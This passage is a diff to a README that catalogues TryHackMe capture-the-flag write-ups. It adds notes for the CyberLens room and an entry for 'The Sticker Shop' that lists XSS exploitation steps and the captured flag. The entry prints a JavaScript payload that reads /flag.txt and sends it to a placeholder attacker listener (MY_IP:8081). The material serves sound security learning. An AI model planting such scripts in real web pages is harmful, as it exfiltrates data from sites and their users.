@@ -28,6 +28,49 @@ A walkthrough of the CyberLens room on TryHackMe where I tackled:
 - exiftool
 - and more...
 
+  🛡️ **Lessons Learned:**
+- [x] Always enumerate all provided media and files — hidden messages are common in CTFs.
+- [x] Metadata and file formats can reveal more than expected (e.g., EXIF, hidden ZIPs).
+- [x] Don't skip packet analysis — the answer is often buried in plain sight within the pcap.
+- [x] Automation tools like `stegseek` or `binwalk` can save massive time when exploring binary data.
+
+---
+
+### 📌 [The Sticker Shop – TryHackMe](https://medium.com/@rahaliashraf732/the-sticker-shop-046f5b9bec95)
+An XSS-based exploitation of a vulnerable feedback form to exfiltrate a protected flag from the webserver.
+
+> 📝 [Read full write-up on Medium](https://medium.com/@rahaliashraf732/the-sticker-shop-046f5b9bec95)  
+[![Read on Medium](https://img.shields.io/badge/Read_on-Medium-black?logo=medium)](https://medium.com/@rahaliashraf732/the-sticker-shop-046f5b9bec95)
+
+📌 **Topics covered:**
+- XSS (Cross-Site Scripting)
+- Access Control Bypass
+- Same-Origin Policy (SOP) Exploitation
+- JavaScript Payload Crafting
+
+🛠️ **Exploitation Steps:**
+1. Recon with `nmap` and `gobuster` to discover exposed HTTP service and directories.
+2. Identified XSS via the feedback form using a `<script>alert(1)</script>` test.
+3. Injected payload to fetch `/flag.txt` and leak it to a remote listener.
+4. Captured the flag using a Python HTTP server.
+5. Decoded exfiltrated content: `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`
+
+🧪 **Payload Used:**
+```html
+<script>
+  fetch('/flag.txt')
+    .then(r => r.text())
+    .then(data => {
+      window.location = 'http://MY_IP:8081/receive?flag=' + encodeURIComponent(data);
+    });
+</script>
+
+🛡️ **Lessons Learned:**
+
+- [x] Input sanitization is critical.
+- [x] Same-Origin Policy can be abused if proper authentication isn’t enforced.
+- [x] Feedback forms are common entry points for reflected XSS.
+
 ---
 
 ## 🔜 Coming Soon
